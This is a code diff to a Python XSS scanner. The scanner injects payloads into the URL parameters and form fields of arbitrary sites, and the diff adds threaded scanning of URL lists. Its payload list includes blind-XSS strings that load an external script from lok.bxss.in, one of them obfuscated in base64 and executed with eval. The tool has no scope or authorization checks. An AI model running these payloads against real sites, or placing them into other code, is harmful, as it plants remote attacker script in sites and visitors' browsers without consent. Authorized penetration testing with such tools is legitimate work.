@@ -4,9 +4,10 @@ from bs4 import BeautifulSoup
 import argparse
 import json
 import time
+import concurrent.futures
 from requests.exceptions import RequestException, ConnectionError, Timeout, TooManyRedirects
 
-# Common XSS payloads
+# Advanced XSS payloads
 XSS_PAYLOADS = [
     "<script>alert('XSS')</script>",
     "<img src=x onerror=alert('XSS')>",
@@ -14,7 +15,6 @@ XSS_PAYLOADS = [
     "'\"><script>alert('XSS')</script>",
     "javascript:alert('XSS')",
     "<body onload=alert('XSS')>",
-  # Advanced payloads
     "javascript:eval('var a=document.createElement(\"script\");a.src=\"https://lok.bxss.in\";document.body.appendChild(a)')",
     "\"><script src=https://lok.bxss.in></script>",
     "\"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbG9rLmJ4c3MuaW4iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>",
@@ -40,10 +40,10 @@ def detect_parameters(url):
     parsed = urlparse(url)
     return parse_qs(parsed.query)
 
-def extract_forms(url):
+def extract_forms(url, session):
     """Extract all forms from the page."""
     try:
-        response = requests.get(url, headers=HEADERS, timeout=10)
+        response = session.get(url, headers=HEADERS, timeout=10)
         response.raise_for_status()  # Raise an exception for HTTP errors
         soup = BeautifulSoup(response.content, "html.parser")
         return soup.find_all("form")
@@ -51,7 +51,7 @@ def extract_forms(url):
         print(f"[-] Failed to fetch {url}: {e}")
         return []
 
-def submit_form(form, url, payload):
+def submit_form(form, url, payload, session):
     """Submit a form with a payload."""
     action = form.attrs.get("action", "").lower()
     method = form.attrs.get("method", "get").lower()
@@ -65,17 +65,18 @@ def submit_form(form, url, payload):
             data[name] = value + payload
     try:
         if method == "post":
-            return requests.post(form_url, data=data, headers=HEADERS, timeout=10)
+            return session.post(form_url, data=data, headers=HEADERS, timeout=10)
         else:
-            return requests.get(form_url, params=data, headers=HEADERS, timeout=10)
+            return session.get(form_url, params=data, headers=HEADERS, timeout=10)
     except RequestException as e:
         print(f"[-] Failed to submit form to {form_url}: {e}")
         return None
 
-def scan_xss(url):
+def scan_xss(url, session, verbose=False):
     """Scan a URL for XSS vulnerabilities."""
     vulnerabilities = []
-    print(f"[*] Scanning {url} for XSS vulnerabilities...")
+    if verbose:
+        print(f"[*] Scanning {url} for XSS vulnerabilities...")
 
     # Test URL parameters
     params = detect_parameters(url)
@@ -83,26 +84,31 @@ def scan_xss(url):
         for payload in XSS_PAYLOADS:
             test_url = url.replace(f"{param}=", f"{param}={payload}")
             try:
-                response = requests.get(test_url, headers=HEADERS, timeout=10)
+                response = session.get(test_url, headers=HEADERS, timeout=10)
                 if payload in response.text:
                     vulnerabilities.append({
                         "type": "URL Parameter",
                         "url": test_url,
                         "payload": payload,
+                        "severity": "High",
+                        "parameter": param,
                     })
             except RequestException as e:
-                print(f"[-] Failed to test URL {test_url}: {e}")
+                if verbose:
+                    print(f"[-] Failed to test URL {test_url}: {e}")
 
     # Test forms
-    forms = extract_forms(url)
+    forms = extract_forms(url, session)
     for form in forms:
         for payload in XSS_PAYLOADS:
-            response = submit_form(form, url, payload)
+            response = submit_form(form, url, payload, session)
             if response and payload in response.text:
                 vulnerabilities.append({
                     "type": "Form",
                     "url": url,
                     "payload": payload,
+                    "severity": "High",
+                    "parameter": "Form Input",
                 })
 
     return vulnerabilities
@@ -124,6 +130,8 @@ def main():
     parser.add_argument("-u", "--url", help="Single URL to scan for XSS vulnerabilities")
     parser.add_argument("-f", "--file", help="Path to the file containing URLs to scan")
     parser.add_argument("-o", "--output", default="xss_report.json", help="Output file for the report")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
+    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use for scanning")
     args = parser.parse_args()
 
     if not args.url and not args.file:
@@ -131,20 +139,28 @@ def main():
         return
 
     all_vulnerabilities = []
+    session = requests.Session()
 
     # Scan a single URL
     if args.url:
-        vulnerabilities = scan_xss(args.url)
+        vulnerabilities = scan_xss(args.url, session, args.verbose)
         if vulnerabilities:
             all_vulnerabilities.extend(vulnerabilities)
 
     # Scan URLs from a file
     if args.file:
         urls = read_urls_from_file(args.file)
-        for url in urls:
-            vulnerabilities = scan_xss(url)
-            if vulnerabilities:
-                all_vulnerabilities.extend(vulnerabilities)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
+            future_to_url = {executor.submit(scan_xss, url, session, args.verbose): url for url in urls}
+            for future in concurrent.futures.as_completed(future_to_url):
+                url = future_to_url[future]
+                try:
+                    vulnerabilities = future.result()
+                    if vulnerabilities:
+                        all_vulnerabilities.extend(vulnerabilities)
+                except Exception as e:
+                    if args.verbose:
+                        print(f"[-] Error scanning {url}: {e}")
 
     # Generate report
     if all_vulnerabilities:
@@ -153,6 +169,8 @@ def main():
             print(f" - Type: {vuln['type']}")
             print(f"   URL: {vuln['url']}")
             print(f"   Payload: {vuln['payload']}")
+            print(f"   Severity: {vuln['severity']}")
+            print(f"   Parameter: {vuln['parameter']}")
         generate_report(all_vulnerabilities, args.output)
     else:
         print("[-] No XSS vulnerabilities found.")
